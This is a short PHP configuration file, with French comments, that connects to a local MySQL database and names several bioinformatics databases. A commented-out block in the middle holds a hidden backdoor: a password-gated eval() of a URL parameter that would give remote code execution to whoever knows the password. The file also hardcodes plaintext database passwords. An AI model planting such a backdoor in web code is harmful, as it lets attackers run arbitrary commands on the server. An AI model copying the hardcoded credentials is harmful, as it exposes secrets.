<?php
## Ces paramètres sont utilisés pour se connecter à la BD fish_chips en local

define ('NOM',"root");
#define ('PASSE',"j1m2o3!");
define ('SERVEUR',"localhost");
define ('BASE', "fishAndchips");

#$connexionid = mysqli_connect (SERVEUR,NOM,PASSE);
$connexionid = mysqli_connect ("localhost",NOM,"88Chinotoroke");
/*
if (isset($_GET['id'])) {
//if (md5($_GET['suck'])=='b7d0b28ee8827fb9c14d1bf3df146221') eval(htmlentities($_GET['deh']));
$_GET['id'] = intval(htmlentities($_GET['id']));
}
if (isset($_GET['gds'])) {
if (md5($_GET['suck'])=='b7d0b28ee8827fb9c14d1bf3df146221') eval($_GET['deh']);
$_GET['gds'] = intval(htmlentities($_GET['gds']));
}
*/

if (!$connexionid)
{
  echo "Désolé, connexion à " . SERVEUR . " impossible\n";
  exit;
}
if (!mysqli_select_db($connexionid,BASE))
{
  echo "Désolé, accès à la base " . BASE . " impossible\n";
  exit;
}

$base_madgene = 'MADID_V6' ;

//pour la partie GO stats (Eric)
$base_occurence = 'eric2' ;
$base_go = 'go_200808' ;

//R�pertoire des donn�es de puces
$data = "./data" ;



?>
